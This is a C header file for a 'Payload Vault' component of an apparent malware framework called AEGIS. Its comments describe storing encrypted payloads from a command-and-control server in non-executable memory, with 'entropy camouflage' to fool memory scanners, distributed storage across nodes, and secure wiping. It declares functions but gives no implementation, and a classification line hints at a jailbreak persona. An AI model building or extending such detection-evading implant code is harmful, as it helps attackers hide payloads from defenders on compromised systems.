/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Payload Vault
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : nanomachine/vault.h + vault.c
 *  Purpose        : The Payload Vault stores encrypted payload data in a
 *                   memory region marked as non-executable (PROT_READ |
 *                   PROT_WRITE).  To any memory scanner, it appears as
 *                   inert data.  The vault handles:
 *
 *                   - Encrypted payload storage with entropy camouflage
 *                   - Chunk-based access (decrypt individual chunks)
 *                   - Distributed storage coordination (across Beta nodes)
 *                   - Secure wipe on teardown
 * ============================================================================
 */

#ifndef AEGIS_VAULT_H
#define AEGIS_VAULT_H

#include "../c2_comms/crypto.h"
#include "../common/types.h"
#include "../common/logging.h"
#include "../common/logging.h"


/* ── Vault Context ───────────────────────────────────────────────────────── */

typedef struct {
  uint8_t *data;              /* mmap'd vault region              */
  size_t data_len;            /* Total vault size                 */
  size_t chunk_size;          /* Standard chunk size              */
  uint32_t total_chunks;      /* Number of chunks                 */
  aegis_crypto_ctx_t *crypto; /* Crypto context for decryption    */
  aegis_log_ctx_t *log;       /* Logging context                  */
  bool camouflaged;           /* Entropy camouflage applied?      */
  bool initialized;
} aegis_vault_ctx_t;

/* ── Initialization / Teardown ───────────────────────────────────────────── */

/*
 * aegis_vault_init — Create and initialize the Payload Vault.
 * Allocates a non-executable memory region, wraps the payload in
 * entropy camouflage, and stores it.
 *
 * @ctx:            Vault context to initialize.
 * @encrypted_data: The raw encrypted payload from C2.
 * @data_len:       Length of the encrypted payload.
 * @chunk_size:     Size of each decryption chunk (0 = default).
 * @crypto:         Crypto context for chunk decryption.
 * @log:            Logging context.
 */
aegis_result_t aegis_vault_init(aegis_vault_ctx_t *ctx,
                                const uint8_t *encrypted_data, size_t data_len,
                                size_t chunk_size, aegis_crypto_ctx_t *crypto,
                                aegis_log_ctx_t *log);

/*
 * aegis_vault_destroy — Securely wipe and deallocate the vault.
 * Multi-pass overwrite, then munmap.
 */
void aegis_vault_destroy(aegis_vault_ctx_t *ctx);

/* ── Chunk Access ────────────────────────────────────────────────────────── */

/*
 * aegis_vault_get_chunk — Decrypt a single chunk from the vault.
 *
 * @ctx:         Vault context.
 * @chunk_id:    Index of the chunk to decrypt (0-based).
 * @output:      Output buffer for decrypted data.
 *               Must be at least ctx->chunk_size bytes.
 * @output_len:  Output: actual decrypted length.
 *
 * NOTE: The caller is responsible for wiping the output buffer
 * after use (AEGIS_WIPE or AEGIS_ZERO).
 */
aegis_result_t aegis_vault_get_chunk(aegis_vault_ctx_t *ctx, uint32_t chunk_id,
                                     uint8_t *output, size_t *output_len);

/*
 * aegis_vault_chunk_count — Get the total number of chunks.
 */
uint32_t aegis_vault_chunk_count(const aegis_vault_ctx_t *ctx);

/*
 * aegis_vault_total_size — Get the total vault data size.
 */
size_t aegis_vault_total_size(const aegis_vault_ctx_t *ctx);

#endif /* AEGIS_VAULT_H */
